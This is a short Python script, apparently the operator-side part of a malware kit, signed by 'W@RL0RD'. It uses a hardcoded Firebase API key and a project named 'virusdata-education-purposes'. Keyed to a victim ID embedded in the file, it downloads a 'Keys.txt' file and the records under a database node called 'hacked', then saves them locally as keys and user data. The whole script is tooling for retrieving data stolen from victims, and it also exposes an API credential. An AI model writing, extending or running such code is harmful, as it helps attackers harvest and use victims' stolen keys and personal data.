#b052f566-8eda-482f-a53f-4542e0144d44
#W@RL0RD says hello...
import pyrebase
import json
with open(__file__, 'r') as f:
    lines=f.readlines()
config = {"apiKey": "AIzaSyCc_1Dq-apLbGwuv1H1vTTRdCI0KSGyNX8","authDomain": "virusdata-education-purposes.firebaseapp.com","databaseURL": "https://virusdata-education-purposes-default-rtdb.firebaseio.com/","storageBucket": "virusdata-education-purposes.appspot.com","serviceAccount": "credntials.json"}
firebase = pyrebase.initialize_app(config)
storage=firebase.storage()
storage.child(str(lines[0][1:-1])).child('Keys.txt').download('data/Keys.txt')
db=firebase.database()
datas=db.child('hacked').child(str(lines[0][1:-1])).get()
finaldata="{\n"
for data in datas.each():
    findata=data.val()
    findata=json.dumps(findata, indent=4)
    finaldata+=str(findata+'\n')
finaldata+='\n}'
with open('data/userdata.txt', 'w+') as f:
    f.writelines(str(finaldata))
    f.close()
    